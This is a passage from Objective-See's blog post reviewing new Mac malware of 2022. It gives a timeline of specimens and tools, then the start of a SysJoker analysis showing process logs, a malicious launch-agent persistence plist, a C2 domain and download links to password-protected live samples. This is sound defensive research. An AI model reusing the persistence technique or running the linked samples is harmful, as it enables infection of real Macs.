<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  
  <head>

    <meta charset="UTF-8">
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    
    <link href="/css/style.css" rel="stylesheet" />
    <link href="/css/menu.css" rel="stylesheet" />

    
    <script src="/js/analytics.js"></script>
    <script src="/js/sweetalert.min.js"></script>
    <script src="/js/donationPopup.js"></script>
    <script src="/js/cookies.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>

    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

  
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x71/cmPlist.png />
<meta name="twitter:title" content=The&#32;Mac&#32;Malware&#32;of&#32;2022&#32;üëæ />
<meta name="twitter:description" content=A&#32;comprehensive&#32;analysis&#32;of&#32;the&#32;year&#39;s&#32;new&#32;malware />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=The&#32;Mac&#32;Malware&#32;of&#32;2022&#32;üëæ />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x71/cmPlist.png />


  </head>

  <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/tools.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    
    <div class="pageContent">
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">The Mac Malware of 2022 üëæ</div>
  <div class="blogSubTitle">A comprehensive analysis of the year&#39;s new malware</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / January 1, 2023</div>
  <link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />
<style type="text/css">
@media print { body { -webkit-print-color-adjust: exact; } }
</style>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
        <div class="logo-link">
            <a href="https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/jamf.png" height="64px;">
                <br>
                <div class="logo-title">Jamf</div>
            </a>
        </div>
        <div class="logo-link">
            <a href="https://l.linklyhq.com/l/18wF2" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/mosyle.png" height="66px;">
                <br>
                <div class="logo-title">Mosyle</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="http://kandji.io/" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kandji.png" height="64px;">
                <br>
                <div class="logo-title">Kandji</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://macpaw.com/cleanmymac" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/cmm.png" height="64px;">
                <br>
                <div class="logo-title">CleanMyMac X</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://l.kolide.co/Objective-See" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kolide.png" height="66px;">
                <br>
                <div class="logo-title">Kolide</div>
            </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://fleetdm.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/fleetdm.png" height="64px;">
        <div class="logo-title">Fleet</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.paloaltonetworks.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/panw.png" height="64px;">
        <div class="logo-title">Palo Alto Networks</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.sophos.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/sophos.png" height="64px;">
        <div class="logo-title">Sophos</div>
        </a>
        </div>
    </center>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>All samples covered in this post are available in our <a href="https://objective-see.com/malware.html">malware collection</a>.</p>
<div align="right" style="padding-right:10px; padding-bottom:10px;">
...just please don‚Äôt infect yourself! üòÖ
</div>
</div>
<br>
<h3 id="-printable">üñ®Ô∏è Printable</h3>
<p>A printable (PDF) version of this report can be found here:</p>
<center>
  <a class="inlineLink" style="font-size: 18;" href="../downloads/MacMalware_2022.pdf">The Mac Malware of 2022.pdf</a>
</center>
<br>
<h3 id="-background">‚åõ Background</h3>
<p>Goodbye 2022 &hellip;and hello 2023! ü•≥</p>
<p>For the 7th year in a row, I&rsquo;ve put together a blog post that comprehensively covers all the new Mac malware that appeared during the course of the year.</p>
<p>While the specimens may have been reported on before (i.e. by the AV company that discovered them), this blog aims to cumulatively and comprehensively cover all the new Mac malware of 2022 - in one place &hellip;yes, with samples of each malware available for download.</p>
<p>After reading this blog post, you should have a thorough understanding of recent threats targeting macOS. This is especially important as Macs continue to flourish, especially compared to other personal computers brands. In fact, an <a href="https://www.idc.com/getdoc.jsp?containerId=prUS49755822">industry report</a> from late 2022 showed that the year-over-year growth of all of the top 5 computer companies declined significantly ‚Ä¶except for Apple who saw a 40% increase!</p>
<p>This growth is especially apparent in the context of the enterprise so much that <a href="https://www.computerworld.com/article/3679730/jamf-q3-data-confirms-rapid-mac-adoption-across-the-enterprise.html">many believe</a> &ldquo;<em>Mac will become the dominant enterprise endpoint by 2030</em>&rdquo;:</p>
<img src="../images/blog/blog_0x71/enterprise.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Apple in the Enterprise</center>

<p>&hellip;and unsurprisingly macOS malware continues following suit, becoming ever more prevalent (and insidious).</p>
<div class="note">
In this blog post, we focus on new Mac malware specimens or significant new variants that appeared in 2022. Adware and/or malware from previous years, are not covered. 
<p>However at the end of this blog, I&rsquo;ve included a <a href="#-and-all-others">section</a> dedicated to these other threats, that includes a brief overview, and links to detailed write-ups.</div></p>
<p>For each malicious specimen covered in this post, we&rsquo;ll discuss the malware&rsquo;s:</p>
<ul>
<li>
<p><strong>Infection Vector</strong>:
<br>
How it was able to infect macOS systems.</p>
</li>
<li>
<p><strong>Persistence Mechanism</strong>:
<br>
How it installed itself, to ensure it would be automatically restarted on reboot/user login.</p>
</li>
<li>
<p><strong>Features &amp; Goals</strong>:
<br>
What was the purpose of the malware? a backdoor? a cryptocurrency miner? or something more insidious&hellip;</p>
</li>
<li>
<p><strong>Indicators of Compromise</strong>:
<br>
What are the observable &ldquo;symptoms&rdquo; of the malware &hellip;including its executable components, created files/directories, and of course (if relevant) address of network endpoints such as command and control servers.</p>
</li>
</ul>
<p>Also, for each malware specimen, I&rsquo;ve added a direct download link to the malware specimen should you want to follow along with my analysis or dig into the malware more yourself. #SharingIsCaring
<br>
<br></p>
<h3 id="-timeline">üóìÔ∏è Timeline</h3>
<p>Below is a timeline highlighting the new macOS malware of 2022, covered in this post:</p>
<ul class="timeline">
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 8px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-sysjoker">SysJoker</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>01/2022</code>
          <br />
          <br />
          A simple cross-platform backdoor supporting download and execute capabilities.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-dazzlespy">DazzleSpy</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>01/2022</code>
          <br />
          <br />
          A feature complete cyber-espionage implant, deployed via a Safari exploit.
        </div>
      </div>
    </li>
    <li>
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/crypto.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-coinminer">CoinMiner</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>03/2022</code>
          <br />
          <br />
          A cryto-currency miner that leverages many open-source components.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-gimmick">Gimmick</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>03/2022</code>
          <br />
          <br />
          A multi-platform fully featured implant, leveraging cloud providers for command &amp; control.
        </div>
      </div>
    </li>
    <li>
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-orat">oRat</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>04/2022</code>
          <br />
          <br />
          Belonging to a new APT group, this macOS implant supports a myriad of features and capabilities. 
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-cratedepression">CrateDepression</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>05/2022</code>
          <br />
          <br />
          Spread though "typosquatting" of a popular Rust Crate, this malware installed the open-source persistent Poseidon agent.
        </div>
      </div>
    </li>
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-pymafka">Pymafka</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>05/2022</code>
          <br />
          <br />
          Spread though "typosquatting" of a popular Python package, this Python-based malware installs a compiled Cobalt Strike agent.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-vpn-trojan-covid">"VPN Trojan" ("Covid")</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>07/2022</code>
          <br />
          <br />
          A persistent backdoor that downloads and executes 2<sup>nd</sup>-stage payloads directly from memory.
        </div>
      </div>
    </li>
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-cloudmensis">CloudMensis</a>
          </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>07/2022</code>
          <br />
          <br />
          Leveraging cloud providers for its command &amp; control, this malware exfiltrates items such as documents, keystrokes, and screen shots.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-rshell">rShell</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>08/2022</code>
          <br />
          <br />
          Delivered via a supply-chain attack, this backdoor affords basic, albeit sufficient capabilities to a remote attacker. 
        </div>
      </div>
    </li>
    <li>
    <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x53/backdoor.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-heading">
          <a class="inlineLink" href="#-insekt">Insekt</a>
        </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>10/2022</code>
          <br />
          <br />
          The Alchimist attack framework deploys cross-platform "Insekt" payloads including macOS variants.
        </div>
      </div>
    </li>
    <li class="timeline-inverted">
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-body">
          <a class="inlineLink" href="#-keysteal">KeySteal</a>
          </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>11/2022</code>
          <br />
          <br />
          A simple keychain stealer embedded in a trojanized copy of a popular free application. 
        </div>
      </div>
    </li>
    <li>
      <div class="timeline-badge info">
      <i class="glyphicon">
        <img src="../images/blog/blog_0x5F/spy.png" width="32" style="padding-top: 10px;"/>
      </i>
      </div>
      <div class="timeline-panel">
        <div class="timeline-body">
          <a class="inlineLink" href="#-sentinelsneak">SentinelSneak</a>
          </div>
        <div class="timeline-body" style="padding-top: 10px;">
          <code>12/2022</code>
          <br />
          <br />
          Relying on a "typosquatting" attack, this malicious Python package targeted developers with the goal of exfiltrating sensitive data.
        </div>
      </div>
    </li>
</ul>
<br>
<h3 id="-malware-analysis-tools-amp-tactics">üõ†Ô∏è Malware Analysis Tools &amp; Tactics</h3>
<p>Before we dive in, let&rsquo;s briefly mention malware analysis tools.</p>
<p>Throughout this blog, I reference various tools used in analyzing the malware specimens.<br>
While there are a myriad of malware analysis tools, these are some of my own tools, and other favorites, and include:</p>
<ul>
<li>
<p><a href="https://objective-see.com/products/utilities.html#ProcessMonitor"><code>ProcessMonitor</code></a>
<br>
My open-source utility that monitors process creations and terminations, providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a>
<br>
My open-source utility that monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/utilities.html#DNSMonitor"><code>DNSMonitor</code></a>
<br>
My open-source utility that monitors DNS traffic providing detailed information domain name questions, answers, and more.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>
<br>
My open-source utility that displays code-signing information, via the UI.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/netiquette.html"><code>Netiquette</code></a>
<br>
My open-source (light-weight) network monitor.</p>
</li>
<li>
<p><code>lldb</code>
<br>
The de-facto commandline debugger for macOS. Installed (to <code>/usr/bin/lldb</code>) as part of Xcode.</p>
</li>
<li>
<p><a href="https://mothersruin.com/software/SuspiciousPackage/">Suspicious Package</a>
A tools for &ldquo;inspecting macOS Installer Packages&rdquo; (.pkgs), which also allows you to easily extract files directly from the .pkg.</p>
</li>
<li>
<p><a href="https://www.hopperapp.com/"><code>Hopper Disassembler</code></a>
<br>
A &ldquo;reverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications&rdquo; &hellip;or malware specimens.</p>
</li>
</ul>
<br>
<div class="note">
üìö Interested in general Mac malware analysis techniques?
<br>
<table style="border: 0px;">
  <tr>
    <td>
      <img src="../images/blog/blog_0x6B/book.png" height="300px;">
    </td>
    <td style="border: 0px;" width="75%">
    You're in luck, as I've written a book on this topic:
    <br>
  <center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
  </center>
  </td>
  </tr>
</table>
</div>
<br>
<h3 id="-sysjoker">üëæ <strong><code>SysJoker</code></strong></h3>
<div class="note">
<p>SysJoker is a simple cross-platform backdoor supporting download and execute capabilities.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/SysJoker.zip"><code>SysJoker</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p><code>SysJoker</code> was discovered by <a href="https://www.intezer.com/">Intezer</a>, initially on a Linux server. However further research by Intezer researchers <a href="https://twitter.com/AbbyMCH">Avigayil</a>, <a href="https://twitter.com/NicoleFishi19">Nicole</a>, and <a href="https://twitter.com/MhicRoibin">Ryan</a> uncovered a macOS variant as well:
<blockquote>
  "<i>SysJoker was first discovered during an active attack on a Linux-based web server of a leading educational institution. After further investigation, we found that SysJoker also has Mach-O and Windows PE versions.</i>" -Intezer 
</blockquote>
<br></p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">üÉèJust published a new research analyzing the <a href="https://twitter.com/hashtag/SysJoker?src=hash&amp;ref_src=twsrc%5Etfw">#SysJoker</a> backdoor.  <br><br>SysJoker targets Windows, Linux and macOS. <br><br>Learn more about this new threat, its capabilities, behavior and (most importantly) how to detect it -&gt;<br> <a href="https://t.co/9iOAA5SjSj">https://t.co/9iOAA5SjSj</a><a href="https://twitter.com/NicoleFishi19?ref_src=twsrc%5Etfw">@NicoleFishi19</a> <a href="https://twitter.com/MhicRoibin?ref_src=twsrc%5Etfw">@MhicRoibin</a> <a href="https://t.co/siBA5OMiI5">pic.twitter.com/siBA5OMiI5</a></p>&mdash; Avigayil Mechtinger (@AbbyMCH) <a href="https://twitter.com/AbbyMCH/status/1480932289454518279?ref_src=twsrc%5Etfw">January 11, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://objective-see.com/blog/blog_0x6C.html">&ldquo;SysJoker: The first (macOS) malware of 2022&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.intezer.com/blog/incident-response/new-backdoor-sysjoker/">&ldquo;New SysJoker Backdoor Targets Windows, Linux, and macOS&rdquo;</a></p>
</li>
</ul>
<p><br>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown, possible via infected npm packages</span></p></p>
<p>Intezer did not disclose how the macOS variant of SysJoker spreads or infects Mac systems, though mused that, &ldquo;<i>a possible attack vector for this malware is via an infected npm package</i>.&rdquo; What is known is that the macOS variant is named <code>types-config.ts</code> to masquerade as a typescript file.</p>
<p>Using macOS‚Äô built-in file command we can see that in reality it&rsquo;s a universal (&ldquo;fat&rdquo;) mach-O binary, containing both Intel and arm64 builds:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file SysJoker/types-config.ts 
SysJoker/types-config.ts: Mach-O universal binary with 2 architectures: 
[x86_64:Mach-O 64-bit executable x86_64] / [arm64:Mach-O 64-bit executable arm64]

SysJoker/types-config.ts (for architecture x86_64):  Mach-O 64-bit executable x86_64
SysJoker/types-config.ts (for architecture arm64):   Mach-O 64-bit executable arm64
</pre>
</div></p>
<p>The <code>arm64</code> build ensures the malware can run natively on Apple Silicon (M1/M2).</p>
<p><a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>, my open-source utility that displays code-signing information via the UI, shows that this binary is signed, albeit via an adhoc signature:</p>
<img src="../images/blog/blog_0x6C/signed.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">SysJoker signed, though ad-hoc</center>

<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Item</span>
</p>
<p><code>SysJoker</code> persists as a launch agent (<code>com.apple.update.plist</code>).
<br></p>
<p>Run the <code>string</code> utility to extracted any embedded (ASCII) strings, reveals both the launch agent path (<code>/Library/LaunchAgents/com.apple.update.plist</code>) as well an embedded launch item property list template (<code>com.apple.update.plist</code>) for persistence.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings - SysJoker/types-config.ts   
...
/Library/LaunchAgents
/Library/LaunchAgents/com.apple.update.plist
...
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.apple.update&lt;/string&gt;
        &lt;key&gt;LimitLoadToSessionType&lt;/key&gt;
        &lt;string&gt;Aqua&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;
&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
        &lt;dict&gt;
           &lt;key&gt;SuccessfulExit&lt;/key&gt;
           &lt;true/&gt;
        &lt;/dict&gt;
        &lt;key&gt;RunAtLoad&lt;/key&gt;
        &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
...
</pre>
</div>
<p>As the malware appears to be written in C++, which rather complex to statically reverse, its easier to lean on dynamic analysis tools to observe it&rsquo;s persistence.</p>
<p>Via my <a href="https://objective-see.com/products/utilities.html#ProcessMonitor"><code>ProcessMonitor</code></a>, we can run the malware in a VM and observe many of the malware&rsquo;s actions, such as the fact that when initially run, it copies itself to the user&rsquo;s <code>Library/MacOsServices/</code> directory, as <code>updateMacOs</code> &hellip;and then launches this copy:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
...
{
¬†¬†"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
¬†¬†"process" : {
¬†¬†¬†¬†...
¬†¬†¬†¬†"arguments" : [
¬†¬†¬†¬†¬†¬†"cp",
¬†¬†¬†¬†¬†¬†"./types-config.ts",
¬†¬†¬†¬†¬†¬†"/Users/user/Library/MacOsServices/updateMacOs"
¬†¬†¬†¬†],
¬†¬†¬†¬†"path" : "/bin/cp",
¬†¬†¬†¬†"name" : "cp",
¬†¬†¬†¬†"pid" : 1404
¬†¬†}
¬†¬†...
}

{
¬†¬†"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
¬†¬†"process" : {
¬†¬†¬†¬†...
¬†¬†¬†¬†"arguments" : [
¬†¬†¬†¬†¬†¬†"sh",
¬†¬†¬†¬†¬†¬†"-c",
¬†¬†¬†¬†¬†¬†"nohup '/Users/user/Library/MacOsServices/updateMacOs' >/dev/null 2>&1 &"
¬†¬†¬†¬†],
¬†¬†¬†¬†"path" : "/bin/bash",
¬†¬†¬†¬†"name" : "bash",
¬†¬†¬†¬†"pid" : 1405
¬†¬†}
¬†¬†...
}

</pre>
</div>
<p>If one has <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> installed, it will detects the malware attempting to persist:</p>
<img src="../images/blog/blog_0x6C/bb.jpg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">SysJoker&#39;s persistence</center>

<p>Allowing the malware to persist, allows us to take a peek at the property list, <code>com.apple.update.plist</code> it creates:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% cat ~/Library/LaunchAgents/com.apple.update.plist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;Label&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;com.apple.update&lt;/string&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;LimitLoadToSessionType&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;Aqua&lt;/string&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;array&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Users/user/Library/MacOsServices/updateMacOs&lt;/string&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/array&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;KeepAlive&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;SuccessfulExit&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;true/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dict&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;RunAtLoad&lt;/key&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;

</pre>
</div>
<p>No surprises here. The launch agent plist (populated from the template we saw as an embedded string) points the malware&rsquo;s copy: <code>/Users/user/Library/MacOsServices/updateMacOs</code>. And, as the <code>RunAtLoad</code> key is set to <code>true</code>, the malware will be restarted each time the user logs in.</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Persistent Backdoor (supporting download and execute).
</span>
</p>
<p>Debugging the malware (in an isolated VM) reveals it first performs a simple survey of its host. This survey is then sent to the malware&rsquo;s remote command &amp; control server (<code>graphic-updater.com</code>) when the malware initially checks in:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) x/s $rdx
